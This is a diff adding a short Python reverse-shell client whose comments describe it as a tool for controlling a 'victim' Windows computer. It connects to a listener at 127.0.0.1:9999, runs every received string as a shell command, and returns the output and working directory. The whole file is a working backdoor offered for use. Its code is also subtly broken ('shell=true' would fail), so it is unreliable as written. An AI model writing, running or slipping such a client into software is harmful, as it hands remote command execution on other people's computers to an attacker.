@@ -1,0 +1,29 @@
+#Revserse shell Program client
+#We want to control another Windows computer through the server and give commands to the command window of the client or victim
+
+import socket
+import os            # operating system used for provides functions for interacting with the operating system.
+import subprocess    # processes that exists on windows computer.
+
+s = socket.socket()
+host = "127.0.0.1"
+port = 9999
+
+s.connect((host, port))
+
+while True:
+    data = s.recv(1024)
+    if data[:2].decode("utf-8")== 'cd':     # for finding if comand starts with cd or not
+        os.chdir(data[3:].decode("utf-8"))  # for getting the comand after cd
+
+    if len(data) > 0:
+        cmd = subprocess.Popen((data[:].decode("utf-8")), shell=true, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)   # popen used for execute the command specified by the string command
+            # 3 parameters stdout is the standard output received by the command window , stderr shows the error that has been occured in command window
+
+        output_byte = cmd.stdout.read() + cmd.stderr.read()   # stores the output either the output or the error 
+        output_string = str(output_byte, "utf-8")             #converting into basic utf-8 format string
+        currentWD = os.getcwd() + "> "   # gives the path where the current working directory is without a > , so an additional is rquired
+        s.send(str.encode(output_string + currentWD))         #sending  both the output string as well as the current word directory 
+        print (output_string)
+
+
